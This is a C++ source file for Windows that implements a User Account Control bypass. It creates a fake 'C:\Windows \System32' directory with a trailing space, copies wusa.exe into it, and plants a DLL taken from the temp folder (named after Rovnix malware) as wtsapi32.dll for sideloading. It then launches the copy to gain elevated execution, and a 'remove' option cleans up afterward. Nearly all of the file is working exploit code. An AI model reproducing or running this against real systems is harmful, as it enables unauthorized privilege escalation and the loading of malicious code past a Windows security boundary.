#include <Windows.h>
#include <stdio.h>

int wmain() {
	int pNumArgs;
	auto argv = CommandLineToArgvW(GetCommandLine(), &pNumArgs);

	if (pNumArgs > 1) {
		int result = wcscmp(argv[1], L"remove");
		if (result == 0) {
			DeleteFile(L"\\\\?\\C:\\Windows \\System32\\wtsapi32.dll");
			DeleteFile(L"\\\\?\\C:\\Windows \\System32\\wusa.exe");
			RemoveDirectory(L"\\\\?\\C:\\Windows \\System32");
			if (RemoveDirectory(L"\\\\?\\C:\\Windows ")) {
				printf("\n[*] Masqueraded Trusted Directory is removed!");
			}
			return 0;
		}
	}

	WCHAR lpBuffer[1024];
	DWORD size = 1024;

	if (!CreateDirectory(L"\\\\?\\C:\\Windows ", NULL)) {
		printf("\n[-] Path cannot be created: %d", GetLastError());
		return -1;
	}
	if (!CreateDirectory(L"\\\\?\\C:\\Windows \\System32", NULL)) {
		printf("\n[-] Path cannot be created: %d", GetLastError());
		return -1;
	}
	printf("\n[+] Masqueraded Trusted Directory is created!");
	if (!CopyFile(L"\\\\?\\C:\\Windows\\System32\\wusa.exe", L"\\\\?\\C:\\Windows \\System32\\wusa.exe", FALSE)) {
		printf("\n[-] Wusa.exe cannot be copied: %d", GetLastError());
		return -1;
	}
	printf("\n[+] Wusa.exe is copied");

	GetEnvironmentVariable(L"TMP", lpBuffer, size);
	wcscat_s(lpBuffer, L"\\RovnixUAC.dll");
	printf("\n[*] DLL Directory: %ws", lpBuffer);

	if (!CopyFile(lpBuffer, L"\\\\?\\C:\\Windows \\System32\\wtsapi32.dll", TRUE)) {
		printf("\n[-] Wtsapi32.dll cannot be copied: %d", GetLastError());
		return -1;
	}
	printf("\n[+] Wtsapi32.dll is copied");

	WCHAR name[] = L"\\\\?\\C:\\Windows \\System32\\wusa.exe";
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	if (!CreateProcess(nullptr, name, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
		printf("\n[-] Process Creation is failed: %d", GetLastError());
		return -1;
	}
	printf("\n[+] New process is created!");
	Sleep(1000);
	
	printf("\n");
	return 0;
}